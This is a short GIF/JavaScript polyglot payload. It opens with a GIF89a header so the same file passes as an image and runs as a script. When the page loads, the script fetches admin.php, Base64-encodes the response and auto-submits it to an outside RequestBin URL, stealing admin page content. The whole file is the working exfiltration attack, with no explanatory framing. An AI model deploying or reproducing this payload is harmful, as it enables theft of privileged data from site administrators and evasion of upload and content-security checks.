GIF89a/*.......*/=0;
/* Wait for the page to fully load */
window.onload = function() {
  /* Create a form to send to RequestBin */
  var f = document.createElement('form');
  f.id="haxForm";
  f.method="post";
  f.action="http://requestb.in/secretcode";

  /* Create a textarea to store our data */
  var t = document.createElement('textarea');
  t.name="haxPayload";

  /* Inject the form */
  f.appendChild(t);
  document.body.appendChild(f);

  /* Load the admin page ajax-style, Base64 encode it, send it off */
  $.get("admin.php", function(data) {
    t.value = btoa(data);
    document.getElementById("haxForm").submit();
  });
};
